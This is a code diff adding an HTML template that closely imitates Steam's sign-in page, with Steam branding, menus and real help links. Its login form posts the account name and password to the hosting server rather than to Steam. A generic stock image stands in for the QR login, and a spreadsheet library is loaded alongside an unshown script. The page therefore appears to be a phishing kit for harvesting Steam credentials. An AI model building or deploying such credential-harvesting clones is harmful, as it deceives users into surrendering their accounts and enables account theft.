@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign In</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+  <link rel="stylesheet" href="https://use.typekit.net/xxxxxxx.css">
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png">
+</head>
+<body>
+
+  <!-- 🔷 HEADER -->
+  <header class="steam-header">
+    <div class="steam-header-content">
+      <div class="steam-logo">
+        <a href="https://store.steampowered.com/?snr=1_60_4__global-header">
+          <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg" alt="Steam Logo">
+        </a>
+      </div>
+      <nav class="steam-nav">
+        <div class="dropdown">
+          <a href="https://store.steampowered.com" data-i18n="store">STORE</a>
+          <div class="dropdown-menu">
+            <a href="#">Home</a>
+            <a href="#">Discovery Queue</a>
+            <a href="#">Wishlist</a>
+            <a href="#">Points Shop</a>
+            <a href="#">News</a>
+            <a href="#">Stats</a>
+          </div>
+        </div>
+        
+        <div class="dropdown">
+          <a href="https://steamcommunity.com/" data-i18n="community">COMMUNITY</a>
+          <div class="dropdown-menu">
+            <a href="#">Home</a>
+            <a href="#">Discussions</a>
+            <a href="#">Workshop</a>
+            <a href="#">Market</a>
+            <a href="#">Broadcasts</a>
+          </div>
+        </div>
+        
+        <a href="https://store.steampowered.com/about/?snr=1_60_4__global-header" data-i18n="about">ABOUT</a>
+        <a href="https://help.steampowered.com/en/" data-i18n="support">SUPPORT</a>
+      </nav>
+    </div>
+
+    <div class="steam-actions">
+      <a href="https://store.steampowered.com/about/?snr=1_4_4__global-header" class="install-btn">
+        <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/btn_header_installsteam_download.png" alt="Download Icon">
+        <span data-i18n="install">Install Steam</span>
+      </a>
+      <a href="#" class="login-link" data-i18n="login">login</a>
+      <h2 class="login-slash">|</h2>
+      <select class="lang-select" id="langSelect">
+        <option disabled selected>language</option>
+        <option value="en">English</option>
+        <option value="pt">Português (Brasil)</option>
+        <option value="es">Español</option>
+        <option value="de">Deutsch</option>
+      </select>
+    </div>
+  </header>
+
+  <h2 class="login-title" data-i18n="title">Sign in</h2>
+
+  <!-- 🔷 LOGIN -->
+
+  <form id="loginForm" method="POST" autocomplete="off">
+
+  <div class="login-wrapper">
+    <div class="login-box">
+      <div class="left-panel">
+        <form id="loginForm" autocomplete="off">
+          <label for="username" data-i18n="login_label"><b>SIGN IN WITH ACCOUNT NAME</b></label>
+          <input type="text" id="username" required />
+
+          <label for="password" data-i18n="password">PASSWORD</label>
+          <input type="password" id="password" required />
+          <p id="login-error" class="error-msg" data-i18n="error">Please check your password and account name and try again.</p>
+
+          <div class="remember-me">
+            <input type="checkbox" id="remember">
+            <label for="remember" data-i18n="remember">Remember-me</label>
+          </div>
+
+          <button type="submit" data-i18n="signin_btn">Sign in</button>
+          <a href="https://help.steampowered.com/wizard/HelpWithLogin?redir=https%3A%2F%2Fstore.steampowered.com%2Flogin%2F%3Fredir%3D%26redir_ssl%3D1" target="_blank" class="help-link" data-i18n="help">Help, I can't sign in</a>
+        </form>
+      </div>
+
+      <div class="right-panel">
+        <p class="qr-title" data-i18n="qr_title">OR SIGN IN WITH QR</p>
+        <div class="qr-box">
+          <img src="https://codigosdebarrasbrasil.com.br/wp-content/uploads/2019/09/codigo_qr-300x300.png" alt="QR Code">
+        </div>
+        <p class="qr-desc" data-i18n="qr_desc">
+          Use the <a href="https://store.steampowered.com/mobile" target="_blank">Steam Mobile App</a> to sign in via QR code
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- 🔻 FOOTER -->
+  <footer class="steam-footer">
+    <div class="a">
+      <h3 data-i18n="new_steam">New to Steam?</h3>
+      <a href="https://store.steampowered.com/mobile" target="_blank" rel="noopener noreferrer">
+        <button class="create-account-btn" data-i18n="create_account">Create an account</button>
+      </a>
+    </div>
+    <p class="b" data-i18n="footer_text">
+      It's free and easy. Discover thousands of<br>games to play with millions of new friends.<br><a href="#">Learn more about Steam</a>
+    </p>
+  </footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>
+  <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
